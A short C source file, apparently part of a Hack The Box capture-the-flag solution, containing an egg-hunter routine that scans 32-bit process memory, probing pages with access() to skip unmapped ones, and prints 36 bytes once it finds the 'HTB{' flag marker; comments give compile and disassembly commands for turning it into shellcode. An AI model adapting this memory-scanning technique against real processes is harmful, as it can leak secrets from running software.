//gcc -m32 -c -o search search.c
//ndisasm -b 32 search
//objdump -D search > search.asm

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

void search()
{	
	for(uint32_t addr = 0x60000000; addr <= 0xf7000000; addr += 4096)
	{
		for( uint32_t offset = 0; offset < 4096; offset += 4)
		{
			if( access((const char *)(addr+offset), 0) == -14 )	//EFAULT
				break;

			if( *((uint32_t *)(addr+offset)) == 0x7b425448 )	//hex(u32('HTB{'))
			{
				write(1, (void *)(addr+offset), 36);
				return;
			}

		}
	}
}
